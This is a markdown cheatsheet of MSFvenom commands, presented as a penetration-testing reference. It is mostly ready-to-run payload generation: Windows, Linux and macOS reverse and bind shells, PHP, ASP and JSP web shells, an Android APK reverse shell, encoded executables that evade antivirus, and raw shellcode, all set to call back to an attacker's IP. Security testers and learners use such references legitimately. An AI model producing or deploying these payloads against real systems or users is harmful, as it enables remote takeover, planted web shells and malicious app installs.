# MSFvenom Comprehensive Command Cheatsheet

MSFvenom is a powerful tool in the Metasploit Framework used to generate various types of payloads for penetration testing and security research. This cheatsheet provides a comprehensive list of commonly used MSFvenom commands, organized by payload type and use case, for easy navigation.

---

## Table of Contents

1. [Basic Syntax](#basic-syntax)
2. [Payload Types](#payload-types)
    - [Windows Payloads](#windows-payloads)
    - [Linux Payloads](#linux-payloads)
    - [Mac OS X Payloads](#mac-os-x-payloads)
    - [Web Payloads (PHP, ASP, JSP)](#web-payloads)
    - [Android Payloads](#android-payloads)
3. [Encoders & Formats](#encoders--formats)
4. [Shellcode Generation](#shellcode-generation)
5. [Useful Tips](#useful-tips)
6. [References](#references)

---

## Basic Syntax

```sh
msfvenom -p <PAYLOAD> LHOST=<ATTACKER_IP> LPORT=<PORT> -f <FORMAT> -o <OUTPUT_FILE>
```
- `-p` : Payload to use  
- `LHOST` : Attacker's IP address  
- `LPORT` : Listening port  
- `-f` : Output format (e.g., exe, elf, php, raw, etc.)  
- `-o` : Output file  

---

## Payload Types

### Windows Payloads

#### Reverse Shell
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe
```

#### Bind Shell
```sh
msfvenom -p windows/meterpreter/bind_tcp RHOST=<TARGET_IP> LPORT=<PORT> -f exe -o bind_shell.exe
```

#### PowerShell Payload
```sh
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f psh-cmd
```

#### Staged and Stageless
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o staged.exe
msfvenom -p windows/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o stageless.exe
```

---

### Linux Payloads

#### Reverse Shell
```sh
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o revshell.elf
```

#### Bind Shell
```sh
msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=<PORT> -f elf -o bind_shell.elf
```

#### Command Injection
```sh
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw
```

---

### Mac OS X Payloads

#### Reverse Shell
```sh
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f macho -o shell.macho
```

---

### Web Payloads

#### PHP
```sh
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shell.php
```

#### ASP
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp -o shell.asp
```

#### JSP
```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shell.jsp
```

---

### Android Payloads

#### APK Reverse Shell
```sh
msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -o app.apk
```

---

## Encoders & Formats

#### List All Payloads
```sh
msfvenom --list payloads
```

#### List All Encoders
```sh
msfvenom --list encoders
```

#### List All Formats
```sh
msfvenom --list formats
```

#### Encode Payload
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe
```
- `-e` : Encoder to use
- `-i` : Number of iterations

---

## Shellcode Generation

#### Generate Shellcode (C format)
```sh
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f c
```

#### Generate Shellcode (Hex format)
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f hex
```

---

## Useful Tips

- **View payload options:**
    ```sh
    msfvenom -p <PAYLOAD> --list-options
    ```
- **Remove null bytes:**
    ```sh
    msfvenom ... -b "\x00"
    ```
- **Multiple output formats:**  
    For example, EXE, ELF, APK, ASP, JSP, PHP, WAR, etc.

---

## References

- [Metasploit Unleashed - MSFvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
- [MSFvenom Payload List](https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit)
- [Metasploit Payloads Documentation](https://docs.metasploit.com/docs/using-metasploit/basics/payloads.html)

---

**Happy Hacking!**
